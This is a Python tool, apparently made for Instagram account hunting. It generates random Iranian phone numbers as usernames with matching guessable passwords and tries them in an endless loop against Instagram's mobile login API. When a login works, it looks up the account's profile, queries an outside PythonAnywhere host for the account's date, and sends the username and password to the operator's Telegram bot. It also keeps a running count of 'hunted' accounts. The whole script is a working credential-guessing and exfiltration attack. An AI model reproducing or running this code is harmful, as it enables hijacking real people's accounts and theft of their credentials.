
import os
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)


    a(f"       𖤛𝐈 𝑳𝐎𝐕𝐄 𝐘𝐎𝐔 𝐀𝑳𝑳𝐎𝐔𝐂𝐇𖤛      {Y}𝐁𝐘{G}:@BMW_5T个")
    sleep(1)
    print('\n\n')
    a(G + ' \n\nTOKEN🍺 ')
    print('\n')
    tok = input(S + '     >> ' + C)
    sleep(1)
    os.system('clear')
    a(A + ' ID🍫 ')
    print('\n')
    ID = input(A + '     >> ' + C)
    sleep(0.1)
    os.system('clear')
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=بسم الله ..... ⏸️").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = f"   كافي تعبت بس اصيد وجبتلك واحد 😂🔥 🍭 ⁦♡⁩      \n ︎\n ..  ꪀꪖꪑꫀ🍩 : {name}\n .  U𝘴ꫀ𝘳🍫 : {userQ}\n .. ᵖᵃˢˢʷᵒʳᵈ 🍬  : {password}\n .. F𝘰𝘭𝘭𝘰𝘸𝘦𝘳𝘴 🍻 : {followes}\n .. 𝘵𝘩𝘦𝘪𝘳 𝘵𝘳𝘰𝘶𝘣𝘭𝘦🍡 : {following}\n .. 𝙳𝙰𝚃𝙴 🍧 : {dat}\n .. 𝚃𝙸𝙼𝙴🍯 : {current_time}\n .♠️.  ᵗʰᵉ ᶰᵘᵐᵇᵉʳ ᵒᶠ ᵃᶜᶜᵒᵘᶰᵗˢ ᶜᵃᵘᵍʰᵗ 个 [{zz}] \n ︎.<•>︎  Dᴇᴠᴇʟᴏᴘᴇʀ 🔥 ~~~~ @DD0Du.\n..   :@BMW_5T♦\n"
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)


    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
    
    print(G + 'lofi✅个 ')
    sleep(0)
    user = '0987654321'
    while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+98917' + us
        password = '0917' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= ali is Here\n\n T𝘩𝘦 𝘵𝘰𝘰𝘭 𝘸𝘢𝘴 𝘮𝘢𝘥𝘦 𝘣𝘺 𝘺𝘰𝘶𝘳 𝐀𝑳𝑳𝐎𝐔𝐂𝐇 𝄵 ⁦♡⁩ ⭐\n->•✔️\n√| @@DD0Du|√\
  \n->• Hunted✔️ [{zz}]\n->•\u200aNot hunted❌ [{aa}]")
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
